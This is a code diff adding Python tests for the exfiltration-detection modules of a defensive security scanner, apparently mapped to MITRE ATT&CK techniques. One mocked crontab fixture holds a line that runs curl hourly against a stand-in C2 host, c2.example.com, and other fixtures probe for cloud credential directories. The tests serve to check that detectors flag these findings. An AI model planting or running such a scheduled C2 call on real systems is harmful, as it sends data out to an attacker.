@@ -210,3 +210,104 @@ class TestExfiltrationOverC2Check:
         m = ExfiltrationOverC2Check()
         result = m.check(session)
         assert result.status == Status.NOT_VULNERABLE
+
+
+# ---------------------------------------------------------------------------
+# New exfiltration modules
+# ---------------------------------------------------------------------------
+
+import importlib
+
+
+class TestNewExfilModulesCommon:
+    MODULE_CLASSES = [
+        ("modules.exfiltration.T1020_automated_exfil", "AutomatedExfilCheck", "T1020"),
+        ("modules.exfiltration.T1030_data_size_limits", "DataSizeLimitsCheck", "T1030"),
+        ("modules.exfiltration.T1011_exfil_other_medium", "ExfilOtherMediumCheck", "T1011"),
+        ("modules.exfiltration.T1052_exfil_physical", "ExfilPhysicalCheck", "T1052"),
+        ("modules.exfiltration.T1567_exfil_web_service", "ExfilWebServiceCheck", "T1567"),
+        ("modules.exfiltration.T1029_scheduled_transfer", "ScheduledTransferCheck", "T1029"),
+    ]
+
+    def test_all_technique_ids(self):
+        for mod_path, cls_name, expected_id in self.MODULE_CLASSES:
+            mod = importlib.import_module(mod_path)
+            cls = getattr(mod, cls_name)
+            assert cls().TECHNIQUE_ID == expected_id
+
+    def test_all_tactic_is_exfiltration(self):
+        for mod_path, cls_name, _ in self.MODULE_CLASSES:
+            mod = importlib.import_module(mod_path)
+            cls = getattr(mod, cls_name)
+            assert cls().TACTIC == Tactic.EXFILTRATION
+
+    def test_all_safe_mode(self):
+        for mod_path, cls_name, _ in self.MODULE_CLASSES:
+            mod = importlib.import_module(mod_path)
+            cls = getattr(mod, cls_name)
+            assert cls().SAFE_MODE is True
+
+    def test_all_have_mitigations(self):
+        for mod_path, cls_name, _ in self.MODULE_CLASSES:
+            mod = importlib.import_module(mod_path)
+            cls = getattr(mod, cls_name)
+            assert len(cls().get_mitigations()) > 0
+
+    def test_simulate_delegates(self):
+        for mod_path, cls_name, _ in self.MODULE_CLASSES:
+            mod = importlib.import_module(mod_path)
+            cls = getattr(mod, cls_name)
+            session = make_session({})
+            assert cls().check(session).status == cls().simulate(session).status
+
+
+class TestAutomatedExfilCheck:
+    def test_cron_network_tool(self):
+        from modules.exfiltration.T1020_automated_exfil import AutomatedExfilCheck
+        session = make_session({
+            "crontab -l": CommandResult("0 * * * * curl -s http://c2.example.com/data\n", "", 0),
+            "systemctl list-timers": CommandResult("", "", 1),
+            "which inotifywait": CommandResult("", "", 1),
+            "which inotifywatch": CommandResult("", "", 1),
+            "which fswatch": CommandResult("", "", 1),
+        })
+        m = AutomatedExfilCheck()
+        result = m.check(session)
+        assert result.status == Status.VULNERABLE
+        assert any("curl" in f.title for f in result.findings)
+
+
+class TestExfilWebServiceCheck:
+    def test_cloud_tools(self):
+        from modules.exfiltration.T1567_exfil_web_service import ExfilWebServiceCheck
+        session = make_session({
+            "which rclone": CommandResult("/usr/bin/rclone\n", "", 0),
+            "which aws": CommandResult("", "", 1),
+            "which gsutil": CommandResult("", "", 1),
+            "which az": CommandResult("", "", 1),
+            "which s3cmd": CommandResult("", "", 1),
+            "which mega-cmd": CommandResult("", "", 1),
+            "test -e ~/.aws": CommandResult("", "", 1),
+            "test -e ~/.config/gcloud": CommandResult("", "", 1),
+            "test -e ~/.azure": CommandResult("", "", 1),
+            "test -e ~/.config/rclone": CommandResult("", "", 1),
+            "which curl": CommandResult("", "", 1),
+        })
+        m = ExfilWebServiceCheck()
+        result = m.check(session)
+        assert result.status == Status.VULNERABLE
+        assert any("rclone" in f.title for f in result.findings)
+
+
+class TestExfilPhysicalCheck:
+    def test_usb_storage_loaded(self):
+        from modules.exfiltration.T1052_exfil_physical import ExfilPhysicalCheck
+        session = make_session({
+            "lsmod": CommandResult("usb_storage  65536  1\n", "", 0),
+            "grep -r 'blacklist usb_storage'": CommandResult("", "", 1),
+            "systemctl is-active usbguard": CommandResult("inactive\n", "", 0),
+            "grep -r 'usb' /etc/udev": CommandResult("", "", 1),
+        })
+        m = ExfilPhysicalCheck()
+        result = m.check(session)
+        assert result.status == Status.VULNERABLE
